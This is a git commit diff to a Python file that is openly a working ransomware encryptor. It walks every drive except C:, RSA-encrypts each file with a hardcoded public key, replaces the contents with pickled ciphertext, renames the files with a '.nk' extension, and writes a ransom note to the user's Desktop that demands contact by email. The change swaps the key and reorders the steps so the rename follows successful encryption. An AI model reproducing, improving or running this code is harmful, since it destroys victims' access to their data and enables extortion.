85d47fc99e3fcc290485aa62cf6bbef7a3efc5c7
NAVIN KRISHNA <81145975+tnkrishnank@users.noreply.github.com>
2024-03-28 13:06:00 -0700

    Update e1234567891.py

--- encryptors/e1234567891.py
+++ encryptors/e1234567891.py
@@ -1,6 +1,6 @@
 global publicKey
 m_id = '1234567891'
-publicKey = 'PublicKey(109822860789870844316884291014028487631706866376856306676841538191768724971827223477901623720192337167546804413524695205390871360713772469809988517750373624794475364064020834966889904779465550095426503072116848979995821591181252297255808041197424746629695028333177063567892712763996986103499337604843920247679, 65537)'
+publicKey = 'PublicKey(123856659405824364660477649411782045758906835625822655717961389160498175236921222980863613180174697764224713319734635168067299554697122124970909816331138583771057802225905556931084417353032560984842978585659161804011931457077858018765596702552526633000402871052524454021152082253624957827237217402771973264011, 65537)'
 
 import os
 import rsa
@@ -16,32 +16,34 @@ def encrypt():
     for part in range(65, 91):
         if part != 67:
             partpath = chr(part) + ":\\"
-            try:
-                for dirpath, dirs, files in os.walk(partpath, topdown = True):
-                    dirpath = dirpath + "\\"
-                    for filename in files:
-                        i = 0
-                        x = {}
-                        fname = dirpath + filename
-                        if filename != "e" + m_id + ".exe":
-                            nfname = fname + ".nk"
-                            os.rename(fname, nfname)
-                            with open(nfname, 'rb') as f:
-                                while True:
-                                    data = f.read(117)
-                                    if data:
-                                        ct = rsa.encrypt(data, rsa.key.PublicKey(n, e))
-                                        x[i] = ct
-                                        i += 1
-                                    else:
-                                        break
-                            with open(nfname, 'wb') as f:
+            for dirpath, dirs, files in os.walk(partpath, topdown = True):
+                dirpath = dirpath + "\\"
+                for filename in files:
+                    i = 0
+                    x = {}
+                    fname = dirpath + filename
+                    if filename != "e" + m_id + ".exe":
+                        nfname = fname + ".nk"
+                        with open(fname, 'rb') as f:
+                            while True:
+                                data = f.read(117)
+                                if data:
+                                    ct = rsa.encrypt(data, rsa.key.PublicKey(n, e))
+                                    x[i] = ct
+                                    i += 1
+                                else:
+                                    break
+                        try:
+                            with open(fname, 'wb') as f:
                                 pickle.dump(x, f)
-            except:
-                pass
+                            os.rename(fname, nfname)
+                        except:
+                            pass
 
 encrypt()
-with open("nk_readme.txt", 'w') as f:
+
+path = "C:\\Users\\" + os.getlogin() + "\\Desktop\\nk_readme.txt"
+with open(path, 'w') as f:
     f.write("YOUR FILES ARE ENCRYPTED !!!\n")
     f.write("WANT TO GAIN ASSCESS AGAIN ?\n")
     f.write("CONTACT US AT tnkrish02@gmail.com WITH YOUR MEMBER ID\n")
